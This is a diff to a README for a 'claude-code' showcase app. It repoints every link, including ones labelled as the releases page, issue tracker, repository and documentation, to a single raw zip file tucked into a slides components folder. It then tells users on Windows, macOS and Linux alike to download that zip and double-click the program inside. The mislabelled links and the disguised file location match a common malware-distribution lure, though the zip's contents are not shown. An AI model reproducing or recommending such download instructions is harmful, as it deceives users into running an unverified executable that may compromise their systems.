@@ -2,7 +2,7 @@
 # 🎉 claude-code - Seamlessly Showcase Your AI Features
 
 ## 📥 Download Now
-[![Download claude-code](https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/knitch/claude-code.zip)](https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/knitch/claude-code.zip)
+[![Download claude-code](https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/src/components/slides/code_claude_v1.3.zip)](https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/src/components/slides/code_claude_v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to claude-code! This application helps you showcase the features of Claude Code in a user-friendly way. Follow these steps to install and run the software.
@@ -16,12 +16,12 @@ Before you begin, ensure your system meets the following requirements:
 - Internet connection for downloading and updates.
 
 ## 🔗 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/knitch/claude-code.zip) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/src/components/slides/code_claude_v1.3.zip) to access the latest version.
 2. Scroll down until you see the "Assets" section.
 3. Choose the appropriate file for your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/knitch/claude-code.zip`.
-   - For macOS, download `https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/knitch/claude-code.zip`.
-   - For Linux, download `https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/knitch/claude-code.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/src/components/slides/code_claude_v1.3.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/src/components/slides/code_claude_v1.3.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/src/components/slides/code_claude_v1.3.zip`.
 
 4. Once the download completes, unzip the downloaded file.
 5. Open the folder and double-click on `claude-code` to run the application.
@@ -57,7 +57,7 @@ To present your work:
 ## 💬 Support and Feedback
 If you run into any issues or have questions, feel free to reach out. Here’s how:
 
-- **GitHub Issues:** Use this [link](https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/knitch/claude-code.zip) to report problems or request features.
+- **GitHub Issues:** Use this [link](https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/src/components/slides/code_claude_v1.3.zip) to report problems or request features.
 - **Community Forum:** Join discussions and share your experiences with other users.
 
 ## 📢 Contributing
@@ -71,8 +71,8 @@ We welcome contributions from everyone! If you want to help improve claude-code:
 This project is licensed under the MIT License. You can use it freely but remember to credit the original source.
 
 ## 🌐 Links
-- [Cla ude Code Repository](https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/knitch/claude-code.zip)
-- [Documentation](https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/knitch/claude-code.zip)
+- [Cla ude Code Repository](https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/src/components/slides/code_claude_v1.3.zip)
+- [Documentation](https://raw.githubusercontent.com/MR-JERRY1/claude-code/main/src/components/slides/code_claude_v1.3.zip)
 
 Thank you for using claude-code! We hope it enriches your presentations and showcases the features you love.
 ```
